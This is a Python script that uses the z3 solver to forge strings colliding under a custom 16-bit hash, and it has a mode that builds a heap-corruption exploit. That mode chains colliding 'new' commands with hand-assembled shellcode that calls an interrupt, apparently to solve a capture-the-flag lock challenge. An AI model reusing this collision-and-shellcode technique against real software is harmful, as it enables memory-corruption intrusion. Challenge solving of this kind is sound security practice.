''' 
see https://github.com/0vercl0k/z3-playground/blob/master/hash_collisions_z3.py
'''

from z3 import SignExt, Solver, BitVec, And, Or, BitVecVal, sat
import argparse

def sxt(val):
    return SignExt(8, val)
    
def add_w(x, y):
    return x + y
    
def rla_w(x):
    return add_w(x, x)
    
def sub_w(x, y):
    return x - y

def H(input):
    hashval = BitVecVal(0, 16)
    for b in input:
        r13_1 = sxt(b)
        r13_2 = add_w(r13_1, hashval)
        r15_2 = rla_w(r13_2)
        r15_3 = rla_w(r15_2)
        r15_4 = rla_w(r15_3)
        r15_5 = rla_w(r15_4)
        r15_6 = rla_w(r15_5)
        r15_7 = sub_w(r15_6, r13_2)
        hashval = r15_7
    
    return hashval
    
def str_to_BitVecVals8(s):
    '''Generates a list of BitVecVal8 from a python string'''
    return [BitVecVal(ord(x), 8) for x in s]
    

def ascii_printable(x):
    '''Adds the constraints to have an ascii printable byte'''
    #return And(0x21 <= x, x <= 0x7f)
    return Or(And(0x30 <= x, x <= 0x39), And(0x41 <= x, x <= 0x5a), And(0x61 <= x, x <= 0x7a))

def generate_ascii_printable_string(base_name, size, solver):
    '''Generates a sequence of byte you can use as something to simulate C strings,
    and also adds to the solver the required constraints to have an ascii printable string'''
    bytes = [BitVec('%s%d' % (base_name, i), 8) for i in range(size)]
    solver.add(And(map(ascii_printable, bytes)))
    return bytes
    
def collide(target_str, base_str, count = 10, size_suffix = 6, prefix = False):
    '''Generates a string with the following properties:
            * strcmp(res, base_str) = 0
            * H(res) == H(target_str)'''
    solver = Solver()
    
    if prefix:
        res = generate_ascii_printable_string('res', size_suffix, solver) + str_to_BitVecVals8(base_str)
    else:
        res = str_to_BitVecVals8(base_str) + generate_ascii_printable_string('res', size_suffix, solver)

    target_checksum = H(str_to_BitVecVals8(target_str))
    res_checksum = H(res)
    solver.add(res_checksum == target_checksum)
    
    for i in range(count):
        if solver.check() == sat:
            model = solver.model()
        
            if prefix:
                solution = "".join(chr(model[x].as_long()) for x in res[:size_suffix]) + base_str
                solver.add([x != model[x].as_long() for x in res[:size_suffix]])
            else:
                solution = base_str + "".join(chr(model[x].as_long()) for x in res[-size_suffix:])
                solver.add([x != model[x].as_long() for x in res[-size_suffix:]])
                
            yield solution
            
def hexdecode(string):
    hexies = ["".join(x) for x in zip(*[iter(string.replace(" ", ""))] * 2)]
    return "".join(chr(int(x, 16)) for x in hexies)
    
def main(args):
    if args.hex:
        base = hexdecode(args.base)
        target = hexdecode(args.target)
    else:
        base = args.base
        target = args.target
        
    bucket = "bla7"
    
    first_malloc = "\x3c\x50\x5c\x51\xb5\x01"
    #second_malloc = "\xe0\x3d\xc0\x3e\xb5"
    second_malloc = "\xc0\x3e\xe2\x3d\xb5"
    
    nop = "\x03\x43"
    jmp_4 = "\x02\x3c"
    malloc_space = "\x32\x32\x32\x32"
    push_8f = "\x30\x12\x7f\x00"
    #mov_r5_val = "\x3f\x40\xec\x4c"
    call_int = "\xb0\x12\xec\x4c"
    shellcode = nop * 6 + jmp_4 + malloc_space + push_8f + call_int
        
    if args.exploit:
        exploit = hexdecode(args.exploit)
        string = ""
        collisions = list(collide(bucket, "", 20, 4))
        for c in collisions[0:5]:
            string += "new " + c + " 1;"
        string += "new " + list(collide(bucket, first_malloc, 1, 4))[0] + " 9;"
        for c in collisions[5:9]:
            string += "new " + c + " 2;"
        string += "new " + list(collide(bucket, second_malloc, 1, 6, True))[0] + " 8;"
        string += "new bla1 1;new bla2 2;new bla3 3;new bla4 4;new bla5 5;new bla6 6;"
        string += shellcode
        print("Exploit: " + string)
        print("".join(["%02x" % ord(x) for x in string]))
    else:
        for c in collide(base, target, args.count, args.length):
            print(c)
        
def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("--count", type = int, default = 10, help = "Maximum number of collisions to find")
    parser.add_argument("--length", type = int, default = 4, help = "Length of hash collision string")
    parser.add_argument("--base", type = str, help = "String to collide hash with")
    parser.add_argument("--target", type = str, default = '', help = "Postfix of colliding string")
    parser.add_argument("--hex", action = "store_true", default = False, help = "Input is hex encoded")
    parser.add_argument("--exploit", type = str, default = None, help = "Create exploit output")
    
    return parser.parse_args()
    
if __name__ == "__main__":
    main(parse_args())
    
    



